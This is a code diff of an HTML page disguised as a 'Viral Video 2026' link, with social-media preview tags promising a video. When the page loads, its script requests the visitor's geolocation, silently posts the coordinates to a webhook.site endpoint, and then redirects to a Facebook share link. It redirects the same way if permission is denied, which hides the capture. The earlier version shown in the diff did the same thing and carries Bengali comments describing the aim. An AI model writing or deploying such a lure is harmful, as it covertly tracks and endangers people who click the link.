@@ -1,35 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting...</title>
+    <title>Viral Video 2026</title>
+    <meta property="og:title" content="Viral Video 2026">
+    <meta property="og:description" content="Watch this amazing video before it's gone!">
+    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
 </head>
-<body style="background-color: white; display: flex; justify-content: center; align-items: center; height: 100vh;">
-    <p>Please wait, loading...</p>
-
+<body style="margin:0; background:white; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <div style="text-align:center;"><p>Please wait, loading...</p></div>
     <script>
+        const targetURL = "https://www.facebook.com/share/1DUtaFbjxj/?mibextid=wwXIfr";
+        const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408";
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408"; 
-
-                    // লোকেশন পাঠানো
-                    fetch(webhookURL, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({ latitude: lat, longitude: lon })
-                    }).then(() => {
-                        // ডাটা পাঠানোর পর তাকে ফেসবুক বা অন্য লিঙ্কে পাঠিয়ে দেওয়া
-                        window.location.href = "https://www.facebook.com"; 
-                    });
-                }, function(error) {
-                    // যদি সে পারমিশন নাও দেয়, তবুও তাকে আসল লিঙ্কে পাঠিয়ে দেওয়া
-                    window.location.href = "https://www.facebook.com";
-                });
-            } else {
-                window.location.href = "https://www.facebook.com";
-            }
+                    fetch(webhookURL, { method: 'POST', mode: 'no-cors', 
+                        body: JSON.stringify({lat: position.coords.latitude, lon: position.coords.longitude}) 
+                    }).then(() => { window.location.href = targetURL; });
+                }, function() { window.location.href = targetURL; }, {timeout: 5000});
+            } else { window.location.href = targetURL; }
         };
     </script>
 </body>
